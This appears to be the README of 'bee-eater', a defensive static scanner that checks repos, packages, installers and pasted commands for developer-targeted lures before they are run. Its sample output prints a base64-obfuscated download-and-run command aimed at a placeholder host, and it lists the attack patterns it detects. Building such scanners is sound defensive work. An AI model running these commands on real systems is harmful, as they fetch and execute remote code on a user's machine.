# bee-eater

Ask a plain question about something you were sent, a take-home repo, a package, an installer, a
command to paste, and get an answer you can act on before you open, install or run it.

The bird catches the wasp and knocks the sting out on a branch before swallowing it.

**Status: pre-alpha, read-only.** `issafe` reads folders, files, repositories, npm and PyPI
packages, macOS installer packages and pasted commands without running any of them, and gives a
verdict that cites its evidence. The second half, a disposable microVM that runs the thing and
watches what it does, is not built yet. The case for building it, the threat set and the design
are in [docs/research-2026-11.md](docs/research-2026-11.md).

## Install

Prebuilt binaries for macOS and Linux (arm64 and x86_64) are on the
[releases page](https://github.com/nuthatch-org/bee-eater/releases), each with a sha256. Or:

```sh
cargo install --git https://github.com/nuthatch-org/bee-eater issafe
```

## Use

```sh
issafe ./take-home-repo                          # a folder or a single file
issafe https://github.com/owner/take-home        # a repository, never checked out
issafe npm:left-pad@1.3.0                        # one published package version
issafe pypi:requests==2.32.3
issafe ./Setup.pkg                               # a macOS installer package
issafe -- 'curl -fsSL https://example.com/install.sh | bash'
pbpaste | issafe                                 # whatever you were told to paste
issafe "a recruiter sent me this, ok?" ./take-home-repo
```

```text
$ issafe -- 'echo Y3VybCAtcyBodHRwczovL3guaW52YWxpZCB8IHpzaA== | base64 -d | zsh'
DANGEROUS  Do not open it in an editor, install it or run it.
the command

What we found
  E1   bad    Decodes hidden text and runs it as a program.
              > echo Y3VybCAtcyBodHRwczovL3guaW52YWxpZCB8IHpzaA== | base64 -d | zsh

What we did not check
  - The command was not run.
```

## Verdicts

It never says "safe". There are four answers, and every one lists what was not checked.

| Verdict | Exit | Means |
|---|---|---|
| no red flags found | 0 | Nothing alarming in what was read. Not the same as safe. |
| could not tell | 10 | Part of it was out of sight: a download not fetched, a compiled program, an unread folder. |
| suspicious | 20 | Strong warning signs. |
| dangerous | 30 | Do not open, install or run it. |

Each finding is numbered (E1, E2 and so on) and points at the file and line it came from.
`--json` prints the whole report for scripts.

## What each input does

**Folders and files** are walked without following links. Fonts and images that are really code,
compiled programs, `node_modules` and build caches are reported rather than skipped silently.

**Repositories** (GitHub, GitLab, Bitbucket, Codeberg, or any https address ending in `.git`) are
fetched as a bare shallow clone with git's own configuration, hooks, credential helpers and every
protocol but https switched off. Each file at the latest commit is then written out by bee-eater
itself, so no checkout, filter, link or submodule gets to act. Lines removed from files that run
by themselves are read over the last 50 steps of history: a lure scrubbed from the latest commit
still counts, capped at a warning, and an auto-run task that has rotated through three or more
download hosts is reported as such. Only public repositories are read.

**npm and PyPI packages** are downloaded from the official registry, checked against the
registry's own hash and unpacked into a throwaway folder, refusing links and paths that climb out.
Nothing is installed. Files that an install hook runs are read as auto-run code. For PyPI the
source archive is preferred, because that is what runs code at install.

**macOS installer packages** (`.pkg`) have their install scripts read, which Installer runs as
root, along with any command the installer's own JavaScript runs. Only the table of contents and
the scripts are read; the payload is skipped and reported as unread. Disk images (`.dmg`) are not
opened, because mounting one hands a hostile filesystem to the kernel.

**Pasted commands** are read, not run. `--fetch` also reads, and never runs, the script the
command would download: it sends a request from your machine with curl's User-Agent, refuses
private and local addresses at every redirect, and stops at 2 MiB. A script that can itself
download more is "could not tell", because installers usually do their real work in that second
download.

## Paste guard

```sh
eval "$(issafe --shell-init zsh)"    # in ~/.zshrc
eval "$(issafe --shell-init bash)"   # in ~/.bashrc, bash 4 or later
```

When Enter is pressed on a line that looks like download-and-run, a base64 decode, `osascript`, a
password check or an AI CLI with its safety prompts off, the line is held and checked. If issafe
finds anything, it prints the verdict above the prompt and keeps the line; Enter again runs it
anyway. Ordinary commands never start issafe. In zsh, an `accept-line` widget from another plugin
is kept and still called; in bash, the guard takes over Enter's binding. macOS's built-in bash 3.2
cannot host it.

## What the static pass catches

- Editor tasks that run when a folder opens (`.vscode`/`.cursor` `tasks.json`, `.code-workspace`),
  including per-OS overrides, hidden terminals, and files VS Code accepts but a parser does not.
- npm install hooks, `setup.py`, in-tree Python build backends, `build.rs`, `.envrc`, Husky hooks,
  and Python `.pth` lines that run at every interpreter start.
- A shipped `.git` directory: `core.fsmonitor`, `hooksPath`, filters, live hooks.
- Download-and-run in its usual shapes, weighed by where it sits: auto-run is dangerous, a shell
  script is suspicious, a pasted command is "could not tell" until the script is fetched.
- Code that runs what a server sends it, secret stores and wallet extensions, fake password
  prompts, AI CLIs started with their safety prompts off, persistence, VM checks, and whitespace
  used to push a command off-screen.

## What comes next

`issafe --doctor` already checks whether a machine has what the sandbox will need, and prints the
fix for anything missing.

The sandbox itself will be a libkrun microVM: KVM on Linux, Hypervisor.framework on Apple Silicon.
It has no network by default, and its home directory is seeded with decoy credentials, wallets
and fake AI CLIs. Evidence will be compiled outside the guest into the same numbered findings, and
the same rules will set a floor that any model explaining the result cannot lower.

The first scope is developer-targeted lures: fake-interview repos, malicious npm and PyPI
packages, `curl | bash` installers and paste-this-command pages. Consumer text scams are out of
scope.

`issafe` is a working name for the command, not a decision.

## Development

```sh
yatr ci        # fmt-check, clippy with warnings denied, tests
```

Lure fixtures are built at test time in `crates/bee-static/tests/lures.rs`. Nothing lure-shaped
is committed, because an editor opening this repo would trust a real `.vscode/tasks.json`. The
paste guard tests drive a real interactive zsh and bash with `expect` and skip where either is
missing.

## Licence

MIT or Apache-2.0, at your option.
